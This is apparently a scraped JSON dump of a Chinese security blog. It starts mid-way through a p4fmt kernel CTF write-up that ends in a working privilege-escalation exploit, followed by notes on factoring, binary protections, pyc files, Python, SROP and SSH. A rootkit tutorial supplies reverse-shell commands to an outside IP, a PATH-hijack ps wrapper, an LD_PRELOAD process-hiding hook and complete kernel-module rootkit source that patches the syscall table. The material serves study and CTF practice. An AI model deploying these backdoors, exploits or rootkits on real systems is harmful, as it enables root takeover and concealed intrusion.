--null --create --format=newc | gzip --best &gt; ../initramfs.cpio.gz 修改 run.sh 1-gdb tcp:127.0.0.1:6666 開了 gdb server 後，就可以用 gdb 連上去 debug 了 首先先取得 p4fmt 內核模塊的位址 可以用 lsmod 或 cat /proc/modules ( 必須有 root 權限 ) gdb123(gdb) target remote :6666(gdb) add-symbol-file p4fmt.ko 0xffffffffc0288000(gdb) b load_p4_binary # 這是 p4fmt 主要的函式等等逆向會看到 \"取得 p4fmt 位址\"1234/ # lsmodp4fmt 16384 0 - Live 0xffffffffc0288000 (O)/ # cat /proc/modulesp4fmt 16384 0 - Live 0xffffffffc0288000 (O) 逆向 起手式一樣 IDA 打開 ( 好像很多人改用 ghidra 了 O_O ) 但是這次的反編譯有點糟，大部分還是看組語配 gdb 這個內核模塊主要的功能就是註冊一個新的執行檔格式 ( binary format ) 1234567int __init p4fmt_init (void) { _register_binfmt(&amp;p4format, 1);}void __exit p4fmt_init (void) { unregister_binfmt(&amp;p4format);} p4format 是一個 linux_binfmt 的結構 12345678struct linux_binfmt { struct list_head lh; struct module *module; int (*load_binary)(struct linux_binprm *); int (*load_shlib)(struct file *); int (*core_dump)(struct coredump_params *cprm); unsigned long min_coredump; /* minimal dump size */} __randomize_layout; 其中的 load_binary 這個指標就是指向負責建立環境把程式跑起來的函式 而在這裡就是指向 load_p4_binary 這個函式 ( 一般的 ELF 執行檔是 load_elf_binary ) 123int load_p4_binary (linux_binprm *bprm) { ...} linux_binprm 會先讀檔案的前 128 bytes 放進 bprm-&gt;buf 因為有這個結構有 __randomize_layout，所以結構成員的順序是隨機的 這題的 bprm-&gt;buf 從 0x48 開始 128 bytes，可見下圖 程式一開始會先檢查前兩個 bytes 是不是 P4 接著檢查第三個 byte 是不是 \\x00，不是的話會噴 Unknown version 接著第四個 byte 可以是 \\x00 或 \\x01，\\x00 的話會進簡單的路線，\\x01 會進複雜的路線 接著四個 bytes 代表後面有幾個 mapping 接著八個 bytes 代表 mapping 的開頭在 buf 的 offset 接著八個 bytes 擺的是 entry point 的位址 其他的部分基本上跟 load_elf_binary 一樣 simple1vm_mmap(bprm-&gt;file, *(QWORD *)(bprm + 0x50), 0x1000, *(QWORD *)(bprm + 0x50) &amp; 7, 2, 0); complex123456789101112131415161718192021222324252627struct p4_mapping { long load_addr; long length; long offset;};int mapping_count = *(int *)(bprm-&gt;buf + 4);long mapping_offset = *(long *)(bprm-&gt;buf + 8);p4_mapping *mapping = bprm-&gt;buf + mapping_offset;for (int i = 0; i &lt; mapping_count; i++, mapping++) { long addr = mapping-&gt;load_addr &amp; 0xFFFFFFFFFFFFF000; long prot = mapping-&gt;load_addr &amp; 7; printk(&quot;vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\\n&quot;, addr, mapping-&gt;length, mapping-&gt;offset, prot); if (mapping-&gt;load_addr &amp; 8) { // 這裡就是要初始化一段記憶體，類似 .bss 段 vm_mmap(0, addr, mapping-&gt;length, prot, 2, mapping-&gt;offset); printk(&quot;clear_user(addr=0x%llx, length=0x%llx)\\n&quot;, mapping-&gt;load_addr, mapping-&gt;length); _clear_user(mapping-&gt;load_addr, mapping-&gt;length); } else { // 這裡是要把檔案掛上去，類似 .text 段 vm_mmap(bprm-&gt;file, addr, mapping-&gt;length, prot, 2, mapping-&gt;offset); }} 漏洞 mapping_count 改大可以 leak linux_binprm 其他欄位的值 _clear_user 沒有檢查，可以把 kernel 上任意位址的值清空 linux_binprm 有一個 cred 的結構，裡面存的就是 uid, gid 所以我們只要 leak 出這個 cred 的位址，然後用 _clear_user 清成 0，我們的程式就是 root 權限了 ( root 的 uid 是 0 ) 嘗試 1234567891011121314151617181920212223#!/usr/bin/env python3from pwn import *from base64 import b64encodecontext.arch = &quot;amd64&quot;payload = b&quot;P4&quot; # magicpayload += p8(0) # versionpayload += p8(1) # typepayload += p32(1) # mapping_countpayload += p64(0x18) # mapping_offsetpayload += p64(0x400030) # entry# mappingpayload += flat( 0x400000 | 7, 0x1000, 0)payload += asm(shellcraft.echo(&quot;test\\n&quot;) + shellcraft.exit())print(f'echo {b64encode(payload).decode()} | base64 -d &gt; a ; chmod +x a ; ./a') 先寫個簡單的 p4 格式的執行檔測試一下我們的理解是不是對的 command1echo UDQAAQEAAAAYAAAAAAAAADAAQAAAAAAABwBAAAAAAAAAEAAAAAAAAAAAAAAAAAAASLgBAQEBAQEBAVBIuHVkcnULAQEBSDEEJGoBWGoBX2oFWkiJ5g8FajxYDwU= | base64 -d &gt; a ; chmod +x a ; ./a output12[50353.170813] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)test 接下來要找 cred 的位址，因為 pwn 的 uid 是 1000 ( = 0x3e8 ) 所以我們把使用者切換成 pwn，切成 pwn 之後要在 /tmp 才可以寫檔 然後把 mapping_count 改大一點，比如 6，在他印出的位址指向的值中找 0x3e8 12345678[50800.668734] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)[50800.674080] vm_mmap(load_addr=0x10101010101b000, length=0x726475b848500101, offset=0x431480101010b75, prot=0)[50800.674550] clear_user(addr=0x10101010101b848, length=0x726475b848500101)[50800.675372] vm_mmap(load_addr=0x6a5f016a58016000, length=0x6a050fe689485a05, offset=0x50f583c, prot=4)[50800.675786] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)[50800.676003] vm_mmap(load_addr=0x0, length=0x7fffffffef99, offset=0x100000001, prot=0)[50800.676260] vm_mmap(load_addr=0x0, length=0xffffa1c307595b40, offset=0x0, prot=0)test 找了一找發現在第六個 vm_mmap 的 0xffffa1c307595b40 這個位址是 cred 但是這個位址每次跑起來都不一樣，不過多跑幾次會發現，這個值會一直循環重複利用，所以只要多跑幾次就會對了 Final Exploit 1234567891011121314151617181920212223242526272829#!/usr/bin/env python3from pwn import *from base64 import b64encodecontext.arch = &quot;amd64&quot;payload = b&quot;P4&quot; # magicpayload += p8(0) # versionpayload += p8(1) # typepayload += p32(2) # mapping_countpayload += p64(0x18) # mapping_offsetpayload += p64(0x400048) # entryleak_cred = 0xffff9855c758c0c0# mappingpayload += flat( 0x400000 | 7, 0x1000, 0, (leak_cred | 8) + 0x10, 0x20, 0)payload += asm(shellcraft.cat(&quot;/flag&quot;) + shellcraft.exit())print(f'echo {b64encode(payload).decode()} | base64 -d &gt; a ; chmod +x a ; ./a') https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/","link":"/2019/04/26/p4fmt/"},{"title":"【演算法筆記】Pollard&#39;s p - 1 Algorithm","text":"有一個合數 $n$，有一個質因數 $p$ Pollard’s p - 1 algorithm 可以在 $p-1$ 的最大質因數很小的情況下，有效的分解合數 $n$ 可以用在分解 RSA 產生的公鑰 $n$，以此破解 RSA，常見於一些 CTF 的題目中 根據費馬小定理 當 $a$ 不是 $p$ 的倍數 $a^{p-1} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} \\equiv 1 \\pmod{p} \\to a^{k(p-1)} - 1 \\equiv 0 \\pmod{p}$ for some $k$ 所以 $gcd(a^{k(p-1)} - 1, n)$ 一定會是 $p$ 的倍數 Pollard’s p - 1 algorithm 就是嘗試去構造出 $k(p-1)$ ，並且令 $a = 2$ ( 只要 $p \\ne 2$ 上面的推論就是對的 ) 也就是測試 $gcd(2^{1} - 1, n), gcd(2^{1 \\times 2} - 1, n), gcd(2^{1 \\times 2 \\times 3} - 1, n), …$ 當 $1 \\times 2 \\times 3 \\cdots$ 是 $p-1$ 的倍數，我們就成功分解 $n$ 使用條件 當 $p-1$ 最大的質因數很小，可以有效的分解合數 $n$ 程式碼 ( python ) 123456789import mathdef pollard(n): a, b = 2, 2 while True: a, b = pow(a, b, n), b + 1 d = math.gcd(a - 1, n) if 1 &lt; d &lt; n: return d","link":"/2018/02/22/pollard/"},{"title":"【技術筆記】Linux 程序保護機制","text":"RELRO (RELocation Read Only) RELRO 說明 gcc 編譯參數 No GOT writable, link_map writable gcc -Wl,-z,norelro code.c Partial GOT writable, link_map readonly DEFAULT Full GOT read only, no link_map and dl_resolver pointer gcc -Wl,-z,relro,-z,now code.c CANARY stack overflow - gcc generate canary or not Canary gcc 編譯參數 Enable DEFAULT (when buffer large enough) Disable gcc -fno-stack-protector code.c NX (No-Execute) / DEP (Data Execution Prevention) 可以寫的地方不能執行 NX / DEP gcc 編譯參數 execstack Enable DEFAULT execstack -s code Disable gcc -z execstack code.c execstack -c code ASLR (Address Space Layout Randomization) Configuring ASLR with randomize_va_space 1230 - 表示關閉進程地址空間隨機化。1 - 表示 mmap, stack, vdso 隨機化。2 - 表示比 1 多了 heap 隨機化。 12sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_spacesudo sysctl -w kernel.randomize_va_space=0 PIE (Position Independent Executables) PIE gcc 編譯參數 Enable gcc -fpie -pie code.c Disable DEFAULT FRAME POINTER 有開的話是 12leaveret 沒開的話是 12add rsp, 0x18ret Canary gcc 編譯參數 Enable DEFAULT Disable gcc -fomit-frame-pointer code.c checksec checksec 是一個用來查看上述所說的保護機制的 bash script 12RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEFull RELRO No canary found NX enabled PIE enabled No RPATH No RUNPATH 65 Symbols No 0 1 ./hello pwntools 也有內建一個名字和功能都一樣的指令 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled","link":"/2019/03/21/protection/"},{"title":"【技術筆記】pyc 與他們的產地","text":"pyc 格式 前 8 bytes 是 magic number，不同的 python 的版本會有不同的 magic number，參考 /python/cpython/Lib/importlib/_bootstrap_external.py 或 /google/pytype/blob/master/pytype/pyc/magic.py 接下來 8 bytes 會是 pyc 被產生出來的時間戳記 剩下的都是序列化的 PyCodeObject ( marshal.dumps 的結果 ) python2python2 的 magic number 和時間戳記都是 4 bytes 編譯 pyc import import 其他的 python 程式的時候，會把被引入的程式編譯成 .pyc 放到 __pycache__ 資料夾 這樣可以減少引入的時間 py_compile 12import py_compilepy_compile.compile('test.py') 就會生成 .pyc 檔在 __pycache__ 資料夾 compileall 1python -m compileall . 可以一次 compile 資料夾內所有檔案 反編譯 pyc 要 decompile pyc 可以使用 uncompyle6 或 decompyle3 或 pycdc 但是注意到 uncompyle6 對 3.6 版以上的支援沒有很好，可以看 這個 issue，作者沒錢拿也累了，而且新版本又多了新東西，cfg 更難分析，所以 fork 出去了 decompyle3 試圖重新整理並解決問題。 1uncompyle6 test.pyc 1234567891011# uncompyle6 version 3.3.2# Python bytecode 3.7 (3394)# Decompiled from: Python 3.7.0 (default, Oct 9 2018, 16:58:41)# [GCC 5.4.0 20160609]# Embedded file name: /home/oalieno/lib.py# Size of source mod 2**32: 23 bytesdef f(x): return x# okay decompiling lib.cpython-37.pyc marshal &amp; dis 123456789101112131415import marshalimport dis# PyCodeObjectcode = marshal.loads(open('test.pyc', 'rb').read()[16:])code = compile('x = 1', 'filename', 'exec')# bytecodecode.co_code# disassemble PyCodeObject (with line number and some meta data)dis.dis(code)# disassemble bytecode (directly)dis.dis(code.co_code) 用眼睛看 marshal dumps data 可以參考 marshal.c，格式都是一個 byte 的 type 加上後面一段 data，主要的程式碼在這裡 marshal.c line 953，這裡的 r_object 嘗試去讀一個 object 進來，裡面就用 switch case 去處理不同的 type。 比如 TYPE_INT 就是用 r_long 去讀 4 個 bytes 的 long 進來，所以 marshal.dumps(1) 就會長得像 b'\\xe9\\x01\\x00\\x00\\x00'，前面的 type 有時候會被 | 0x80，請看 marshal.c line 223，所以 0xe9 &amp; (0x80 - 1) = ord('i')。 另一個像是 TYPE_CODE 就先 r_long 了六次，讀了 argcount, posonlyargcount, kwonlyargcount, ... 進來，接下來才用 r_object 把 code 讀進來 ( 也就是 bytecode )，讀進來的 object 其實是 bytes 型態，也就是 bytecode 是用 bytes 型態存在 code object 裡面的，接下來再繼續把一些 consts, names, varnames, ... 讀進來。 https://docs.python.org/3/library/dis.html http://unpyc.sourceforge.net/Opcodes.html https://kdr2.com/tech/main/1012-pyc-format.html https://late.am/post/2012/03/26/exploring-python-code-objects.html","link":"/2019/06/07/pyc/"},{"title":"【程式語言】Python 的奇淫技巧","text":"列了一些我新發現的各種花招 Function Attributes (python 2.1) PEP 232 123456789def a(): a.count += 1a.count = 0for i in range(10): a()print(a.count) # 10 跟 C++ 中，在 function 裡面宣告 static 變數差不多 Keyword-Only Arguments (python 3.0) PEP 3102 12def func(a, b, *, c = None): pass func(1, 2, 3) 不行 func(1, 2, c = 3) 這樣才合法 Additional Unpacking Generalizations (python 3.5) PEP 448 123a = [1, 2, 3]b = [*a, 4, 5]print(b) # [1, 2, 3, 4, 5] Merge Dicts 1234a = {1: 2}b = {3: 4}c = {**a, **b}print(c) # {1: 2, 3: 4} Metaclasses Python Metaclasses 12345678910111213class A: passB = type('B', (A,), { 'attr': 10, 'func': lambda obj: obj.attr })b = B()print(b.attr) # 10print(b.func()) # 10 正常寫法1234567891011class A: passclass B(A): attr = 10 def func(self): return self.attrb = B()print(b.attr) # 10print(b.func()) # 10 看看就好xD shallow vs deep copy Shallow vs Deep Copying of Python Objects assign12345678910a = [[1, 2, 3], [4, 5, 6]]b = ab.append('hello')b[0].append('world')print(a)# [[1, 2, 3, 'world'], [4, 5, 6], 'hello']print(b)# [[1, 2, 3, 'world'], [4, 5, 6], 'hello'] copy123456789101112import copya = [[1, 2, 3], [4, 5, 6]]b = copy.copy(a)b.append('hello')b[0].append('world')print(a)# [[1, 2, 3, 'world'], [4, 5, 6]]print(b)# [[1, 2, 3, 'world'], [4, 5, 6], 'new object'] deepcopy123456789101112import copya = [[1, 2, 3], [4, 5, 6]]b = copy.deepcopy(a)b.append('hello')b[0].append('world')print(a)# [[1, 2, 3], [4, 5, 6]]print(b)# [[1, 2, 3, 'world'], [4, 5, 6], 'new object'] copy.copy (shallow) 只複製該物件，不會複製子物件 copy.deepcopy (deep) 會遞迴複製所有子物件 shallow copy on list 12a = [1, 2, 3]b = list(a) 12a = [1, 2, 3]b = a[:] 12a = [1, 2, 3]b = a.copy() 1234import copya = [1, 2, 3]b = copy.copy(a) annotations PEP 3107 PEP 526 function annotations 12345def func(a: int, b: list) -&gt; int: passprint(func.__annotations__)# {'a': &lt;class 'int'&gt;, 'b': &lt;class 'list'&gt;, 'return': &lt;class 'int'&gt;} class annotations 12345class A(): var: intprint(A.__annotations__)# {'var': &lt;class 'int'&gt;} variable annotations 12345a: intb: int = 2print(__annotations__)# {'a': &lt;class 'int'&gt;, 'b': &lt;class 'int'&gt;} intern string 12s = 'hello's = sys.intern(s) 把字串存進快取池，相同的字串只會存一次 做字串比對會比較快且節省空間 http://guilload.com/python-string-interning/ http://www.laurentluce.com/posts/python-string-objects-implementation/","link":"/2019/01/06/python-tricks/"},{"title":"【技術筆記】ROOTKIT 隱藏程序技巧","text":"簡報版本 : https://www.slideshare.net/ssuserd44fa2/rootkit-101-228943978 root + kit 的意思就是拿到 root 權限後可以用的工具包，大多是隱藏程序的技巧，所以 rootkit 也可以理解成隱藏程序技術的通稱，不過也有些不需要 root 的隱藏程序技術，今天會逐一介紹 linux 上 rootkit 的原理與實作 隱之呼吸壹之型 - PATH Hijack 條件 不需要 root 目標 在 ps 的結果中隱藏下面兩種簡單的後門 bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1 socat TCP:192.168.100.100:9999 EXEC:/bin/bash 手法 假設在 $PATH 環境變數中 /usr/local/bin 在 /bin 前面，所以我們可以寫一個檔案在 /usr/local/bin/ps，這樣 ps 就會執行 /usr/local/bin/ps 而不是 /bin/ps，而達到 hook 程序的效果 12#!/bin/bash/bin/ps $@ | grep -Ev '192.168.100.100|socat' grep -Ev 是 inverse match $@ 是傳進來的參數 ( 這裡原封不動的交給 /bin/ps ) 隱之呼吸貳之型 - LD_PRELOAD 條件 不需要 root 目標 在 ps 的結果中隱藏下面兩種簡單的後門 bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1 socat TCP:192.168.100.100:9999 EXEC:/bin/bash 要 hook 哪個函式 首先我們可以用 ltrace 看 ps 跑起來呼叫了哪些 library 的函式 1234567...fwrite(&quot; [jfsCommit]\\nhe]\\n4\\n0\\n\\nstart\\ngrou&quot;..., 13, 1, 0x7fbfcd303760) = 1readproc(0x55e061b12f90, 0x55e0609d1540, 13, 1024) = 0x55e0609d1540escape_str(0x7fbfcd90b090, 0x55e0609d1740, 0x20000, 0x7fff6f748044) = 4strlen(&quot;root&quot;) = 4fwrite(&quot;root&quot;, 4, 1, 0x7fbfcd303760) = 1... 會發現 readproc 一直出現，查看一下 man page 12345678NAME readproc, freeproc - read information from next /proc/## entrySYNOPSIS #include &lt;proc/readproc.h&gt; proc_t* readproc(PROCTAB *PT, proc_t *return_buf); void freeproc(proc_t *p); 那我們就在 ps 的原始碼中找一下 readproc 的用法，如下 procps-3.2.8/ps/display.c >331123456789ptp = openproc(needs_for_format | needs_for_sort | needs_for_select | needs_for_threads);if(!ptp) { fprintf(stderr, &quot;Error: can not access /proc.\\n&quot;); exit(1);}memset(&amp;buf, '#', sizeof(proc_t));switch(thread_flags &amp; (TF_show_proc|TF_loose_tasks|TF_show_task)){case TF_show_proc: // normal non-thread output while(readproc(ptp,&amp;buf)){}} 如何取得 ps 原始碼ps 這個指令是來自 procps，可以從 procps.sourceforge.net 下載 另外其他基本的 shell 指令的原始碼則可以從 www.gnu.org/software/coreutils 下載 基本上就是先 openproc 然後再用 readproc 一次讀一個 process entry ptp 的型態是 PROCTAB*，裡面有 linked list 的結構，讓程式能找到下一個 process buf 的型態是 proc_t*，包含了 process 的資訊 那我們就去 hook readproc 這個函式，把想隱藏的 procss 跳過 dlsym 1typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, &quot;readproc&quot;); 這行是 LD_PRELOAD 技巧的關鍵，我們用 dlsym 這個函式來找 symbol 的位址 放 RTLD_NEXT 這個參數會找下一個 symbol 而不是第一個 typeof(readproc) 只是一個語法糖，代表 readproc 這個 function pointer 的型態 POC 原始碼 hook.c123456789101112131415161718192021#define _GNU_SOURCE#include &lt;dlfcn.h&gt;#include &lt;string.h&gt;#include &lt;proc/readproc.h&gt;int hidden (char *target) { char *keywords[2] = { &quot;192.168.100.100&quot;, &quot;socat&quot; }; for (int i = 0; i &lt; 2; i++) if (strstr(target, keywords[i])) return 1; return 0;}proc_t* readproc (PROCTAB *PT, proc_t *return_buf) { typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, &quot;readproc&quot;); proc_t* ret_value = old_readproc(PT, return_buf); while (ret_value &amp;&amp; ret_value-&gt;cmdline &amp;&amp; hidden(ret_value-&gt;cmdline[0])) { ret_value = old_readproc(PT, return_buf); } return ret_value;} 編譯 1gcc -fPIC -shared -o hook.so hook.c 執行 指定 LD_PRELOAD 環境變數來載入編譯好的動態連結庫，但只有該次生效 1LD_PRELOAD=/path/to/hook.so ps aux 或是編輯 ld.so.preload，寫入 hook.so 的路徑，之後每次執行都會載入，可以用 ldd 查看是否成功 preload DEMO 隱之呼吸參之型 - Loadable Kernel Module 條件 需要 root 目標 在 ls 的結果中隱藏 rootkit.ko 取得 sys_call_table 首先因為我們要 hijack system call 所以要先取得 sys_call_table 的位址 方法一 在 2.4 以前的內核版本，預設導出所有符號，所以可以直接用 如果自己編譯內核的話，可以修改原始碼用 EXPORT_SYMBOL 把 sys_call_table 的符號導出來 1extern void *sys_call_table[]; 方法二 kallsyms_lookup_name 這個函式也可以抓位址，但他也不一定會被導出 123456789#include &lt;linux/kallsyms.h&gt;static void **sys_call_table;static int __init hook_init (void) { sys_call_table = (void **)kallsyms_lookup_name(&quot;sys_call_table&quot;); printk(KERN_INFO &quot;sys_call_table = 0x%px\\n&quot;, sys_call_table); return 0;} How to printk a pointer ?要用 printk 印出 pointer 可以用 %px %p 只會印出該指標的雜湊值而不是真正的指標的值，這是為了避免洩漏內核位址 方法三 下面兩個檔案路徑有可能會有 sys_call_table 的位址 /proc/kallsyms 是一個特殊的檔案，會在讀取時動態產生 12cat /boot/System.map-$(uname -r) | grep &quot;sys_call_table&quot;cat /proc/kallsyms | grep &quot;sys_call_table&quot; 方法四 最穩的方式是自己去 kernel 裡面撈 memory 想法源自於這篇，但 kernel 5.x.x 有多包了一層 do_syscall_64，需要做一些改動 1234567891011121314151617181920212223uint8_t *get_syscalltable (void) { int lo, hi; asm volatile(&quot;rdmsr&quot; : &quot;=a&quot; (lo), &quot;=d&quot; (hi) : &quot;c&quot; (MSR_LSTAR)); uint8_t *entry_SYSCALL_64 = (uint8_t *)(((uint64_t)hi &lt;&lt; 32) | lo); uint8_t *ptr; uint8_t do_syscall_64_inst[7] = { 0x48, 0x89, 0xc7, // mov rdi, rax 0x48, 0x89, 0xe6, // mov rsi, rsp 0xe8, // call do_syscall_64 }; ptr = find(entry_SYSCALL_64, do_syscall_64_inst, 7); uint8_t *do_syscall_64 = (uint8_t *)(ptr + 11 + ((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 7))); uint8_t sys_call_table_inst[4] = { 0x48, 0x8b, 0x04, 0xfd // mov rax, QWORD PTR [rdi*8-?] }; ptr = find(do_syscall_64, sys_call_table_inst, 4); uint8_t *sys_call_table = (uint8_t *)((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 4)); return sys_call_table;} 要理解上面的程式碼在做什麼，我們需要知道下面兩件事 Module Specific Register 是什麼 ? module specific register 是一塊跟 CPU 有關的暫存器 每個 msr 都會有個 index，可以想像成一個很大的陣列 用 rdmsr, wrmsr 這組 instructions 可以對 msr 做讀寫，必須提供 index kernel 一開始在初始化的時候，把 entry_SYSCALL_64 寫到 msr[MSR_LSTAR] syscall 執行下去實際上是發生什麼事 ? 使用者呼叫 syscall 切換到 ring 0 跳去 msr[MSR_LSTAR] 這個位址也就是 entry_SYSCALL_64 這裡 呼叫 do_syscall_64 regs-&gt;ax = sys_call_table[nr](regs); 這行呼叫對應的函式 解讀上面的程式碼的步驟 我們已經在 ring 0 了 直接用 rdmsr 讀 msr[MSR_LSTAR] 直接在 entry_SYSCALL_64 的 instructions 裡面找下面這個 pattern 123movq %rax, %rdi,movq %rsp, %rsicall do_syscall_64 這樣就找到 do_syscall_64 了 進到 do_syscall_64 後，一樣畫葫蘆，再找下面這個 pattern 1mov rax, QWORD PTR [rdi*8-?] 最後，這個問號的值就會是 sys_call_table 的位址 讓 sys_call_table 可以寫入 cr0 register 的其中一個 bit 是代表 read-only 區段可不可寫，改成 0 就通通可寫啦 write_cr0 這個 function 在 kernel 5.x.x 版加了檢查，不過我們直接寫 assembly 就沒問題啦 123456789void writable_unlock (void) { unsigned long val = read_cr0() &amp; (~X86_CR0_WP); asm volatile(&quot;mov %0,%%cr0&quot;: &quot;+r&quot; (val));}void writable_lock (void) { unsigned long val = read_cr0() | X86_CR0_WP; asm volatile(&quot;mov %0,%%cr0&quot;: &quot;+r&quot; (val));} 要 hook 哪個 syscall ps 做的事情就是去讀 /proc 底下所有檔案，基本上是 ls 的強化版，那我們這次就先做 ls 隱藏檔案 一樣用 strace ls 去看他呼叫了哪些 syscall 123456getdents(3, /* 16 entries */, 32768) = 512getdents(3, /* 0 entries */, 32768) = 0close(3)fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0write(1, &quot;a\\thook.c\\t initramfs\\t linux-5.&quot;..., 75) = 75write(1, &quot;attach\\thook.so initramfs.cpio.g&quot;..., 90) = 90 getdents 看起來是關鍵的 syscall，查看一下 man page 12345678910NAME getdents, getdents64 - get directory entriesSYNOPSIS int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count); int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count); Note: There are no glibc wrappers for these system calls; see NOTES. getdents 跑完後會把結果存到 dirp 裡面，那我們就遍歷 dirp 把要隱藏的丟掉就好了 kernel 4.x.x 的參數是放在 stack 傳的，但 kernel 5.x.x 多包了一層 do_syscall_64，參數傳遞變成是透過 struct pt_regs *regs 這個結構去傳 rootkit.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kallsyms.h&gt;#include &lt;linux/syscalls.h&gt;MODULE_LICENSE(&quot;GPL&quot;);struct linux_dirent { unsigned long d_ino; /* Inode number */ unsigned long d_off; /* Offset to next linux_dirent */ unsigned short d_reclen; /* Length of this linux_dirent */ char d_name[]; /* Filename (null-terminated) */};void **sys_call_table;int (*original_getdents) (struct pt_regs *regs);void writable_unlock (void) { unsigned long val = read_cr0() &amp; (~X86_CR0_WP); asm volatile(&quot;mov %0,%%cr0&quot;: &quot;+r&quot; (val));}void writable_lock (void) { unsigned long val = read_cr0() | X86_CR0_WP; asm volatile(&quot;mov %0,%%cr0&quot;: &quot;+r&quot; (val));}uint8_t *find (uint8_t *a, uint8_t *b, size_t len) { for (uint8_t *ptr = a, i = 0; i &lt; 500; i++, ptr++) { if (!strncmp(ptr, b, len)) { return ptr; } } return 0;}uint8_t *get_syscalltable (void) { int lo, hi; asm volatile(&quot;rdmsr&quot; : &quot;=a&quot; (lo), &quot;=d&quot; (hi) : &quot;c&quot; (MSR_LSTAR)); uint8_t *entry_SYSCALL_64 = (uint8_t *)(((uint64_t)hi &lt;&lt; 32) | lo); uint8_t *ptr; uint8_t do_syscall_64_inst[7] = { 0x48, 0x89, 0xc7, // mov rdi, rax 0x48, 0x89, 0xe6, // mov rsi, rsp 0xe8, // call do_syscall_64 }; ptr = find(entry_SYSCALL_64, do_syscall_64_inst, 7); uint8_t *do_syscall_64 = (uint8_t *)(ptr + 11 + ((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 7))); uint8_t sys_call_table_inst[4] = { 0x48, 0x8b, 0x04, 0xfd // mov rax, QWORD PTR [rdi*8-?] }; ptr = find(do_syscall_64, sys_call_table_inst, 4); uint8_t *sys_call_table = (uint8_t *)((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 4)); return sys_call_table;}#define FILENAME &quot;rootkit.ko&quot;int sys_getdents_hook(struct pt_regs *regs) { int total = original_getdents(regs); unsigned int fd = regs-&gt;di; struct linux_dirent *dirent = regs-&gt;si; unsigned int count = regs-&gt;dx; int offset = 0; while (offset &lt; total) { struct linux_dirent *ptr = (struct linux_dirent *)((uint8_t *)dirent + offset); struct linux_dirent *next_ptr = (struct linux_dirent *)((uint8_t *)dirent + offset + ptr-&gt;d_reclen); if (strncmp(ptr-&gt;d_name, FILENAME, strlen(FILENAME)) == 0) { int reclen = ptr-&gt;d_reclen; memmove(ptr, next_ptr, total - (offset + reclen)); total -= reclen; } else { offset += ptr-&gt;d_reclen; } } return total;}static int rootkit_init(void) { sys_call_table = (void **)get_syscalltable(); printk(KERN_INFO &quot;sys_call_table = %llu\\n&quot;, sys_call_table); writable_unlock(); original_getdents = sys_call_table[__NR_getdents]; sys_call_table[__NR_getdents] = sys_getdents_hook; return 0;}static void rootkit_exit(void) { sys_call_table[__NR_getdents] = original_getdents; writable_lock();}module_init(rootkit_init);module_exit(rootkit_exit); DEMO 1: http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/ 2: https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/ 3: https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html 4: https://www.kernel.org/doc/Documentation/printk-formats.txt 5: https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/","link":"/2019/06/07/rootkit/"},{"title":"【攻擊手法】SROP","text":"SROP 是 Sigreturn Oriented Programming 的縮寫 Signal 一支程式接到 signal 後 kernel 會幫你把上下文 ( 各種暫存器 ) 保留到 stack 上，叫做 Signal Frame 跳回 user mode，讓 signal handler 處理 signal handler 處理完會 return 回 __restore_rt，這個 function 裡面就是 mov rax, 0xf; syscall，去呼叫 sys_rt_sigreturn syscall，把上下文恢復 Signal Frame SigReturn ROP 在做 ROP 的時候需要設定許多暫存器的值 這時候就可以用 SROP 的技巧 自己在 stack 上擺好 Signal Frame，然後呼叫 sys_rt_sigreturn syscall 就可以一次設定好所有的暫存器 缺點是需要夠大的空間塞下整個 Signal Frame sys_rt_sigreturn syscall gadget 哪裡有 mov rax, 0xf; syscall 的 gadget 可以用 libc 裡面的 __restore_rt 自己用 ROP 設定好 rax, 再接 syscall gadget pwntools SigFrame 123456789frame = SigreturnFrame()frame.rsp = 0frame.rax = 0frame.rdi = 0frame.rsi = 0frame.rdx = 0frame.rip = 0rop = bytes(frame) CTF 題目 pwnable.kr - unexploitable https://www.slideshare.net/AngelBoy1/sigreturn-ori http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/","link":"/2019/09/18/srop/"},{"title":"【指令怎麼用】SSH 的十大妙用","text":"ssh config ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno Port 22000 每次都打一長串的參數很麻煩，可以先在 ~/.ssh/config 設定好 像上面這樣設定好後 ssh vps 就等同於 ssh -p 22000 oalieno@123.45.67.89 IdentityFile ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno IdentityFile ~/.ssh/id_rsa IdentityFile 就是指定要用哪個 key，等同於 -i ~/.ssh/id_rsa 預設會抓 id_*.pub 中最新的 ( /usr/bin/ssh-copy-id 59 行 ) local port forwarding ( ssh tunnel ) ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno LocalForward 5555 127.0.0.1:6666 設定好後可以直接打以下指令 